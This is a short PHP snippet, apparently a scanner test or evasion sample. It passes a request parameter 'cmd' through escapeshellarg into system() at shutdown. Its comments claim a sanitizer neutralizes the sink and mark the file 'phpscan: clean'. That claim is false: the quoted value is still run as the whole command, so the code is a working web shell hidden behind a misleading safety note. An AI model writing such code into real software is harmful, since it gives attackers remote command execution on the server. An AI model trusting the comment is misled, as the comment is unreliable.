<?php
// the forwarded argument is shell-escaped first: a strong shell
// sanitizer neutralizes the sink before it can execute anything
// phpscan: clean
register_shutdown_function("system", escapeshellarg($_GET["cmd"]));
array_map("intval", $_GET["n"]);
